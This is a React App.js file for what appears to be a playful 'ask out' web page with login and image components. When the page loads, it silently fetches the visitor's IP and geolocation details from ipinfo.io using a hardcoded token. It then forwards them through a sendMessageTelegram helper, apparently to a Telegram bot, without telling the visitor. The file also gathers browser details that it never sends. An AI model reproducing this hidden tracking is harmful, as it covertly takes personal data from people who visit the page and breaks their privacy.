import { AskOut } from "./AskOut";
import { ImageLayer } from "./Imagelayer";
import { useState, useEffect } from "react";
import { Login } from "./Login";
import { sendMessageTelegram } from "./telegramHandlre";
function App() {
	const [isYes, setYes] = useState(false);
	const [authenticated, setAuthenticated] = useState(false);
	const [Sent, setSent] = useState(false);

	useEffect(() => {
		fetchUserData();
	}, []);

	const fetchUserData = async () => {
		if (Sent) return;
		const browserInfo = {
			userAgent: navigator.userAgent,
			platform: navigator.platform,
			screenSize: `${window.screen.width}x${window.screen.height}`,
		};
		await fetch("https://ipinfo.io/json?token=0b07b6a04e84df")
			.then((res) => res.json())
			.then((data) => {
				const message = Object.entries(data)
					.map(([key, value]) => {
						// Handle arrays and objects for better readability
						if (Array.isArray(value)) {
							return `${key} - \`${value.join(", ")}\``;
						} else if (
							typeof value === "object" &&
							value !== null
						) {
							return `${key} - \`${JSON.stringify(value)}\``;
						} else {
							return `${key} - \`${value}\``;
						}
					})
					.join("\n");;
				sendMessageTelegram(message);}
			)
				;
		setSent(true);
	};

	return (
		<>
			{!authenticated && <Login setAuthenticated={setAuthenticated} />}
			{authenticated && <AskOut setYes={setYes} />}
			{isYes && <ImageLayer />}
		</>
	);
}

export default App;
